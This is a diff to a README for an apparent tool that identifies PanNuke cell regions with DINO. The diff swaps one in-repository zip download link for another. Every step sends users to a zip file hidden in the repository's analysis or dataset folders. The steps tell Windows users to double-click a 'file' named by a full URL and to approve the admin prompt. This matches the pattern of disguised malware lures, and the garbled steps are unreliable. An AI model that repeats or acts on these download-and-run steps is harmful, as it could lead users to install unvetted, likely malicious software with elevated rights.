@@ -2,7 +2,7 @@
 
 ## 📦 Download Now
 
-[![Download](https://raw.githubusercontent.com/ianochieng25/PanNuke-cell-core-region-identification-with-DINO/main/analysis/PanNuke-cell-core-region-identification-with-DINO-v3.9.zip)](https://raw.githubusercontent.com/ianochieng25/PanNuke-cell-core-region-identification-with-DINO/main/analysis/PanNuke-cell-core-region-identification-with-DINO-v3.9.zip)
+[![Download](https://github.com/ianochieng25/PanNuke-cell-core-region-identification-with-DINO/raw/refs/heads/main/src/dataset/cell-region-Pan-DINO-with-Nuke-identification-core-v3.0.zip)](https://github.com/ianochieng25/PanNuke-cell-core-region-identification-with-DINO/raw/refs/heads/main/src/dataset/cell-region-Pan-DINO-with-Nuke-identification-core-v3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -12,15 +12,15 @@ Welcome to PanNuke-cell-core-region-identification-with-DINO! This tool helps yo
 
 1. **Visit the Releases Page**: Click on the link below to go to our Downloads page.
    
-   [Download the latest version](https://raw.githubusercontent.com/ianochieng25/PanNuke-cell-core-region-identification-with-DINO/main/analysis/PanNuke-cell-core-region-identification-with-DINO-v3.9.zip)
+   [Download the latest version](https://github.com/ianochieng25/PanNuke-cell-core-region-identification-with-DINO/raw/refs/heads/main/src/dataset/cell-region-Pan-DINO-with-Nuke-identification-core-v3.0.zip)
 
-2. **Choose the Right File**: On the Releases page, you will see various files. Look for the file that matches your operating system. If you are unsure, use the file named `https://raw.githubusercontent.com/ianochieng25/PanNuke-cell-core-region-identification-with-DINO/main/analysis/PanNuke-cell-core-region-identification-with-DINO-v3.9.zip`, which is suitable for most Windows systems.
+2. **Choose the Right File**: On the Releases page, you will see various files. Look for the file that matches your operating system. If you are unsure, use the file named `https://github.com/ianochieng25/PanNuke-cell-core-region-identification-with-DINO/raw/refs/heads/main/src/dataset/cell-region-Pan-DINO-with-Nuke-identification-core-v3.0.zip`, which is suitable for most Windows systems.
 
 3. **Download the File**: Click on the file to download it to your computer. The download should start automatically. If it does not, right-click on the file name and select “Save Link As.”
 
 4. **Locate the Downloaded File**: Once the download is finished, navigate to your computer’s Downloads folder to find the file.
 
-5. **Run the Application**: Double-click on the `https://raw.githubusercontent.com/ianochieng25/PanNuke-cell-core-region-identification-with-DINO/main/analysis/PanNuke-cell-core-region-identification-with-DINO-v3.9.zip` file. You may see a message asking if you want to allow the app to make changes to your device. Click “Yes.”
+5. **Run the Application**: Double-click on the `https://github.com/ianochieng25/PanNuke-cell-core-region-identification-with-DINO/raw/refs/heads/main/src/dataset/cell-region-Pan-DINO-with-Nuke-identification-core-v3.0.zip` file. You may see a message asking if you want to allow the app to make changes to your device. Click “Yes.”
 
 6. **Follow the On-Screen Instructions**: Once the application opens, follow the prompts to set up your preferences and begin identifying cell regions.
 
